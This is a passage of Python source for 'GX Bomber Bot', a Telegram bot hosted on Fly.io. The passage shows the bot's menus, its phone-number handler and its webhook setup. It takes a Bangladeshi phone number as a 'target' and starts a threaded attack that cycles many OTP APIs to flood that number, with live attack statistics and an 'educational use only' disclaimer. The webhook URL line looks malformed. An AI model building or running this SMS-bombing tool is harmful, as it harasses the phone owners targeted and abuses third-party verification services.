│  ✅ {len(ULTIMATE_APIS)}+ Active APIs     │
│  ✅ Real-time Live Stats                 │
│  ✅ Professional UI Design               │
│  ✅ Auto-cycle Attack System             │
└───────────────────────────────────────────┘

⚠️ <i>For educational purposes only!</i>
    """
    
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("🚀 START ATTACK", callback_data="start_attack")],
        [InlineKeyboardButton("📊 STATS", callback_data="view_stats")],
        [InlineKeyboardButton("ℹ️ HELP", callback_data="show_help")]
    ])
    
    await update.message.reply_text(
        welcome_text,
        parse_mode='HTML',
        reply_markup=keyboard
    )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button callbacks"""
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    data = query.data
    
    if data == "start_attack":
        if user_id in active_attacks:
            await query.edit_message_text(
                "⚠️ <b>Attack already running!</b>\nPlease stop the current attack first.",
                parse_mode='HTML'
            )
            return
        
        await query.edit_message_text(
            "📱 <b>ENTER TARGET NUMBER</b>\n\n"
            "┌─────────────────────────────────────┐\n"
            "│  Please enter the 11-digit         │\n"
            "│  Bangladeshi phone number          │\n"
            "│  Example: <code>01867624831</code>    │\n"
            "└─────────────────────────────────────┘\n\n"
            "⚠️ <i>Without +88 or 88 prefix</i>",
            parse_mode='HTML'
        )
    
    elif data == "stop_attack":
        if user_id in active_attacks:
            stop_signals[user_id] = True
            await query.edit_message_text(
                "🛑 <b>STOPPING ATTACK...</b>\n⏳ Please wait while the attack terminates.",
                parse_mode='HTML'
            )
        else:
            await query.edit_message_text(
                "ℹ️ <b>No active attack to stop!</b>",
                parse_mode='HTML'
            )
    
    elif data == "view_stats":
        if user_id in active_attacks:
            stats = active_attacks[user_id]["stats"]
            phone = active_attacks[user_id]["phone"]
            
            stats_text = f"""
╔═══════════════════════════════════════════╗
║      📊 ATTACK STATISTICS               ║
╚═══════════════════════════════════════════╝

┌───────────────────────────────────────────┐
│  📱 TARGET: <code>{phone}</code>            │
│  🔄 CYCLES: {stats['cycles']}             │
└───────────────────────────────────────────┘

┌───────────────────────────────────────────┐
│  🚀 REQUESTS: {stats['total']}            │
│  ✅ SUCCESS: {stats['success']}           │
│  ❌ FAILED: {stats['failed']}             │
└───────────────────────────────────────────┘

┌───────────────────────────────────────────┐
│  📡 ACTIVE APIs: {stats['apis']}          │
│  📈 SUCCESS: {int((stats['success']/stats['total'])*100 if stats['total'] > 0 else 0)}%       │
└───────────────────────────────────────────┘

🔄 <i>Stats update automatically every cycle</i>
            """
            
            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("🛑 STOP ATTACK", callback_data="stop_attack")],
                [InlineKeyboardButton("📊 LIVE STATS", callback_data="view_stats")],
                [InlineKeyboardButton("🏠 MAIN MENU", callback_data="main_menu")]
            ])
            
            await query.edit_message_text(
                stats_text,
                parse_mode='HTML',
                reply_markup=keyboard
            )
        else:
            await query.edit_message_text(
                "ℹ️ <b>No active attack session found.</b>\nStart an attack to view statistics.",
                parse_mode='HTML'
            )
    
    elif data == "show_help":
        help_text = f"""
╔═══════════════════════════════════════════╗
║      ℹ️ HELP & SUPPORT                   ║
╚═══════════════════════════════════════════╝

┌───────────────────────────────────────────┐
│  📌 HOW TO USE:                          │
│  1️⃣ Click "START ATTACK"                │
│  2️⃣ Enter 11-digit phone number        │
│  3️⃣ Attack begins automatically        │
│  4️⃣ Monitor live stats in real-time   │
│  5️⃣ Press "STOP" to terminate         │
└───────────────────────────────────────────┘

┌───────────────────────────────────────────┐
│  ⚡ FEATURES:                            │
│  ✅ {len(ULTIMATE_APIS)}+ Active OTP APIs │
│  ✅ High-speed Multi-threading          │
│  ✅ Professional UI Design              │
│  ✅ Real-time Live Statistics           │
└───────────────────────────────────────────┘

┌───────────────────────────────────────────┐
│  👨‍💻 DEVELOPER: {DEVELOPER_ID}           │
│  📧 For support, contact developer      │
└───────────────────────────────────────────┘

⚠️ <i>Educational use only!</i>
        """
        
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🚀 START ATTACK", callback_data="start_attack")],
            [InlineKeyboardButton("📊 STATISTICS", callback_data="view_stats")],
            [InlineKeyboardButton("🏠 MAIN MENU", callback_data="main_menu")]
        ])
        
        await query.edit_message_text(
            help_text,
            parse_mode='HTML',
            reply_markup=keyboard
        )
    
    elif data == "main_menu":
        user_name = query.from_user.first_name or "User"
        
        menu_text = f"""
╔═══════════════════════════════════════════╗
║      🎯 GX BOMBER BOT                   ║
║      <b>MAIN MENU</b>                      ║
╚═══════════════════════════════════════════╝

👤 <b>Welcome back, {user_name}!</b>

┌───────────────────────────────────────────┐
│  📡 APIs: {len(ULTIMATE_APIS)}            │
│  👤 Developer: {DEVELOPER_ID}            │
└───────────────────────────────────────────┘

📌 <i>Select an option below to continue</i>
        """
        
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🚀 START ATTACK", callback_data="start_attack")],
            [InlineKeyboardButton("📊 STATISTICS", callback_data="view_stats")],
            [InlineKeyboardButton("ℹ️ HELP", callback_data="show_help")]
        ])
        
        await query.edit_message_text(
            menu_text,
            parse_mode='HTML',
            reply_markup=keyboard
        )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle text messages"""
    user_id = update.effective_user.id
    text = update.message.text
    
    if re.match(r"^01[3-9]\d{8}$", text):
        if user_id in active_attacks:
            await update.message.reply_text(
                "⚠️ <b>Attack already running!</b>\nPlease stop the current attack first.",
                parse_mode='HTML'
            )
            return
        
        phone = text.strip()
        
        init_text = f"""
╔═══════════════════════════════════════════╗
║      🔥 INITIALIZING ATTACK 🔥           ║
╚═══════════════════════════════════════════╝

┌───────────────────────────────────────────┐
│  📱 TARGET: <code>{phone}</code>            │
│  📡 LOADING APIS: {len(ULTIMATE_APIS)}   │
│  ⚡ STATUS: <b>STARTING...</b>             │
└───────────────────────────────────────────┘

⏳ <i>Please wait while the attack initializes...</i>
        """
        
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🛑 STOP ATTACK", callback_data="stop_attack")],
            [InlineKeyboardButton("📊 LIVE STATS", callback_data="view_stats")],
            [InlineKeyboardButton("🏠 MAIN MENU", callback_data="main_menu")]
        ])
        
        msg = await update.message.reply_text(
            init_text,
            parse_mode='HTML',
            reply_markup=keyboard
        )
        
        class FakeUpdate:
            def __init__(self, message, effective_message):
                self.message = message
                self.effective_message = effective_message
        
        fake_update = FakeUpdate(msg, msg)
        
        thread = threading.Thread(target=run_attack, args=(user_id, phone, fake_update))
        thread.daemon = True
        thread.start()
        
    else:
        await update.message.reply_text(
            "❓ <b>Invalid input!</b>\n\n"
            "Please enter an 11-digit Bangladeshi phone number.\n"
            "Example: <code>01867624831</code>",
            parse_mode='HTML'
        )
# ============================================================
#          FLY.IO AUTO-START / AUTO-STOP WEBHOOK SERVER
# ============================================================

async def telegram_webhook(request):
    """টেলিগ্রাম থেকে আসা প্রতিটি মেসেজ প্রসেস করার ফাংশন"""
    try:
        ptb_application = request.app['ptb_application']
        body = await request.json()
        update = Update.de_json(body, ptb_application.bot)
        await ptb_application.process_update(update)
        return web.Response(text="!", status=200)
    except Exception as e:
        logger.error(f"Error processing update: {e}")
        return web.Response(text="Internal Error", status=500)

async def activate_webhook(request):
    """টেলিগ্রামের সাথে Webhook কানেক্ট করার ফাংশন"""
    ptb_application = request.app['ptb_application']
    # সঠিকভাবে অ্যাপের নামসহ ইউআরএল সেট করা হয়েছে
    webhook_url = f"https://fly.dev{BOT_TOKEN}"
    await ptb_application.bot.set_webhook(url=webhook_url)
    return web.Response(text=f"Webhook Set Successfully! URL: {webhook_url}", status=200)

async def make_app():
    """Aiohttp এবং Telegram Application একসাথে ইনিশিয়ালাইজ করার ফাংশন"""
    ptb_application = Application.builder().token(BOT_TOKEN).build()
    
    ptb_application.add_handler(CommandHandler("start", start_command))
    ptb_application.add_handler(CallbackQueryHandler(button_callback))
    ptb_application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    await ptb_application.initialize()
    await ptb_application.start()

    app = web.Application()
    app['ptb_application'] = ptb_application
    
    app.router.add_post(f'/webhook/{BOT_TOKEN}', telegram_webhook)
    app.router.add_get('/', activate_webhook)
    
    return app

# ============================================================
#                         MAIN FUNCTION
# ============================================================

def main():
    """Main function to start the bot with Webhook"""
    if not BOT_TOKEN:
        raise ValueError("BOT_TOKEN বা TELEGRAM_BOT_TOKEN খুঁজে পাওয়া যায়নি! অনুগ্রহ করে 'fly secrets set' করুন।")
        
    logger.info("🚀 Starting GX Bomber Bot on Fly.io...")
    logger.info(f"👤 Developer: {DEVELOPER_ID}")
    logger.info(f"📡 Total APIs: {len(ULTIMATE_APIS)}")
    
    port = int(os.environ.get('PORT', 8080))
    web.run_app(make_app(), host='0.0.0.0', port=port)

if __name__ == "__main__":
    main()
